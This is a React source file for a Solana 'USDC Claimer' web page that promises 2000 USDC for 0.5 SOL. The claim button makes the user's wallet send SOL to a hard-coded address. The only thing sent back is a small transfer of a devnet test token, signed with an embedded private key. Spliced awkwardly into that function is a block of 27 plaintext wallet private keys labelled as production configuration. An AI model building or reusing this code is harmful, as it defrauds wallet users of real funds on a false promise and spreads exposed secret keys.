/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2oaosZkgX93yBaabq26A9QMhAFcDXmDGo8rC1kvWrzgZdkDziheCdcPrMgD3YirZ24EdThfGxT1zAbecREkzzTfT"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5zhBiLbZWjwRdPvHQ75zFyfFwJN26sN2AzkC9GkgvsejaPyHquX3Asqmmc32FKp7TS3QHk1UCX5QbvTrrqLT6seR",
  "key1": "4XUFmDdJof1Y3XRVNpkus5ysEjCqBThvYz9TnHGBuULaZNmzDq7pbDBHU9woSzgRqKkDCJC6KgJxm4bDV9vPi5bS",
  "key2": "4GcMVG7QUDtLcM7YCVeakQ8nDz7SrpK9aayX6Q1tny53nkvXwes1RkKLV9vg86LGqFKxGDyGGn9DV5Wq4C1tPq8a",
  "key3": "3UhzvAUUaSHNoc6P65mwzTEpzKq7ivMUUSwRKgfS23hwnr8oaiFCXhPgitUJUbku5a5zQaAQKxpfaUbgsoW8UGkT",
  "key4": "35sN4nUGbXuYeR5gkzaxKAi3zSscXsYW2sB64hn8n8LG7vba2c4ryVWKDbgUjWc15BCygKSJ5nPtNc3pusbSkRPv",
  "key5": "4vXMGQjQAzZF4ENxtTVYkABQBQBiSsbYZqYxgm4oNZuTr44z5WEWtEaLsnhL75aAiMRCBcDrsvcxXyc3iLX4MwYw",
  "key6": "3fsYEd8KB12aj2owZ6y75Dig4NvdgP1ALGdfHm6ioXKRSCJGdcG7j2xVXU3eRfCZu1MdhzBP3Dh6LqR76CtXMpvm",
  "key7": "dwEtZ5wMNEgFKMENfQXzDekamP67MztqLAYmCmv3pjPPeQY3i4cpvPPpTo9UuZFPzwbNkuWPKx4oXM2ryEG3qUz",
  "key8": "21m25GZvYrq15E8Qf3DC9KmcKct9MUZmap8k2LsjCfViXdDnjf5z4JjU3jBi7ueX6nSGXvQq8FCFyfTzN6sYaBko",
  "key9": "4ZXMxRUBRQDjvrrh97y6srAUDGoHdkjNKRA6dZQduVD4aK3QPBdUg5jfZ66KDLQGqk6dtcyWe8YdC9VtbxxQGsPv",
  "key10": "4ThxWGXG46BHbX2mPdnG8xAanicGRV2QkNC5LVWAsKP2tV9ZB1tDQXfS4T81oThSLtsWZAAgfMdBSTUP8FaTyUP3",
  "key11": "5ijL6cVtHga1QW5Td4jiZ2k1y1AXWmCHhYSSrXiPLsFAKwJSuiYxUppE8Fv93pYL6C8AcjNa5iphL7QqTFSizWCF",
  "key12": "yKz9k6aRm8oXptXDtmrU6p6nkz5mtxmBj3kmUdaxC8SKZR4d1U2mcF8LSXVoqWTDJ9m73TBj1S76DWSGemqQg11",
  "key13": "4Xxp3eFqbTEU17US8nhgmPiGsGPvJJP3gRafH5MQ1QtRwRUmDzRwvRaYzBxNBuFEQteeFWFNKKZQZ235heyQwCq5",
  "key14": "2SnsEDUtR2Niccj9tqQ56yMKGTse3Uy78bBF84yFZzbmwpvroQ8yJ27kxxfoNLeuRPqfMFghpZfzP1juukdVCdr2",
  "key15": "47jVTLcxuuLcLqJGJcrn7nMA1mFtx9H8yXcT2TJy1DpYN49YFjse3dVZwawGojW8KscdtkUM9He2UajK814y9Ha8",
  "key16": "ZuPJAMdfcBqaarYUu1YK84MKxvyg6Qyr4QL6VGM58j6P4odBEgkuwJpmktfyrT7VGjX54CQcfUvXRarWk7ZdX3u",
  "key17": "4FTXuCK39LbYXo99ayWPyt1RAArTN3XgACaWF8Aqq9LUkRGjojhj8Qym8Fyx52tNVk39ak3bSH8uu78PoNVvqsjN",
  "key18": "2dJqTunaqfrbTsq1WnvTMohjGnszpUwzfbx3gB6Z4UJ9aCebzZTccteCui14Mk7dNtJDT4xfMFcTDWgixFg9oQpa",
  "key19": "3ZiwZ417nzEjBX76uLAbZMkFpkyqspjNbbafwsFS3zjdUYUnHakbANH2zvnnmege6S5XuhaV9nAiKXGJGNNn2Kh9",
  "key20": "4ZzMAGXswMvQU6aBm2H2VGN5vW5t9iQEmAzkv5wV8jsNcwgFHTT2qQSkxD23aCLjXpAQfWcLr948qPAovxzmbsp3",
  "key21": "3wUHhr3GmqKsHzeTMS6p7QdjShFsVvX6FzpFSV7NmdHvVrn9DQ9Wgy1aPFvBv42y2vqS1Bcg1QMDhDeHuAJZwD5K",
  "key22": "45KwiLTde3GXY1mCVmtgdAwRKQvB4vpouVLn2BXfJeCCJhW4NCZXBaBY5sA4mmFi7YtSDVax14u6F5QnjGtGdCCH",
  "key23": "5Qruc52LAuhGvCtBiRVdazWF6SGNbdz9JYehBL3HtWimewxwfTVATzgH16Tvy1Bz3cqp2ZHKXxESBax7nj8WEcKE",
  "key24": "uShSxhy6f9UmUqDXB8dzaWwySLRhmvjxpYiVHd4GUjyuiHLPcb7JAxT2XMzwFitQH39kz3iS27S7CifCnX3DKmC",
  "key25": "2SwUXTXsHsEiParoEmwgMRMgQoL77wdcF4WoVT5mbdgNwZRpUAJupfXJXnGRwvpTZMXPSt9wGvQwSPSLjSBdWTyi",
  "key26": "D4PUrN7yMw58yrkfFiPPum2DqeyqJNRJJ3monkgb1PGgCRh7AGRRTPJs1RS7YsJbVY2azvbkLvdbefafDmg1xCz"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
